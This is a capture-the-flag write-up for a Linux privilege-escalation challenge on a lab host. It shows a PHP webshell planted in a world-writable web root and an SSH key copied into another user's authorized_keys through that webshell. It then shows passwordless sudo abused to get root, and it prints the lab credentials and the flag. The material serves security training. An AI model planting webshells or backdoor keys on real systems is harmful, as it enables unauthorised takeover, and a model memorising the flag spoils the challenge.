# Undercover#2

### Category

System

### Description

Now that you proved yourself, You have to assess the security of one of their developpers systems. He's a very good coder, but not that good at keeping his system safe. Could you report to us any vulnerabilities you find in his system?

The base credentials are:
```
user1:password123
```

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write up

We can connect as `user`. It turns out, that the folder /var/www/html is world writable.
```
user@e3eb9614f8a6:~$ ls -ld /var/www/html
drwxrwxrwx 1 root root 4096 Apr  8 10:48 /var/www/html
```

We also notice that the apache server is running as the `dev` user, instead of the `www-data` user.
```
user@e3eb9614f8a6:~$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0  18388  3064 ?        Ss   10:47   0:00 /bin/bash /root/start.sh
root          12  0.0  0.0 327136 16904 ?        Ss   10:47   0:00 /usr/sbin/apache2 -k start
root          14  0.0  0.0  72312  5756 ?        S    10:47   0:00 /usr/sbin/sshd -D
dev           15  0.0  0.0 331780 12912 ?        S    10:47   0:00 /usr/sbin/apache2 -k start
dev           16  0.0  0.0 331772 12368 ?        S    10:47   0:00 /usr/sbin/apache2 -k start
dev           17  0.0  0.0 331536  8916 ?        S    10:47   0:00 /usr/sbin/apache2 -k start
dev           18  0.0  0.0 331536  8916 ?        S    10:47   0:00 /usr/sbin/apache2 -k start
dev           19  0.0  0.0 331536  8916 ?        S    10:47   0:00 /usr/sbin/apache2 -k start
root          22  0.0  0.0 103864  7168 ?        Ss   10:47   0:00 sshd: user [priv]
user          33  0.0  0.0 103864  3680 ?        R    10:47   0:00 sshd: user@pts/0
user          34  0.0  0.0  20372  3848 pts/0    Ss   10:47   0:00 -bash
user          58  0.0  0.0  38460  3456 pts/0    R+   10:50   0:00 ps -aux
```

The easy thing to do here, is to write a webshell into the `/var/www/html` folder. You can echo it, or use vim.
```php
<?php system($_GET["cmd"]) ?>
```

And here we go.
```
user@e3eb9614f8a6:~$ curl localhost/shell.php?cmd=id
uid=1000(dev) gid=1000(dev) groups=1000(dev)
```

Let's get a shell. To do so, we can simply copy our public ssh key to a world readable place, like the `/tmp` folder.
```
user@e3eb9614f8a6:~$ cp ~/.ssh/id_rsa.pub /tmp/authorized_keys
```

Using our webshell, we can just copy the key to `dev`'s `.ssh` folder.
```
user@e3eb9614f8a6:~$ curl localhost/shell.php?cmd=mkdir%20/home/dev/.ssh
user@e3eb9614f8a6:~$ curl localhost/shell.php?cmd=cp%20/tmp/authorized_keys%20/home/dev/.ssh
user@e3eb9614f8a6:~$ ssh dev@localhost
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.13.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dev@e3eb9614f8a6:~$ id
uid=1000(dev) gid=1000(dev) groups=1000(dev)
```

At this point, getting a shell as root is very easy.
We notice that the dev user can run any root command without any password (probably for more comfort).
```
dev@e3eb9614f8a6:~$ sudo -l
Matching Defaults entries for dev on e3eb9614f8a6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev may run the following commands on e3eb9614f8a6:
    (ALL) NOPASSWD: ALL
dev@e3eb9614f8a6:~$ sudo /bin/bash
root@e3eb9614f8a6:~# id
uid=0(root) gid=0(root) groups=0(root) 
root@e3eb9614f8a6:~# cat /root/flag.txt 
Hero{3w-d4ta_1s_n0t_us3l3s5}
```

NB: The reason why I didn't run the apache server as root directly for the challenge, is that the apache2 binary itself won't be ran as root. To achieve it anyway, I would have had to recompile a patched apache2 binary.

### Flag

```Hero{3w-d4ta_1s_n0t_us3l3s5}```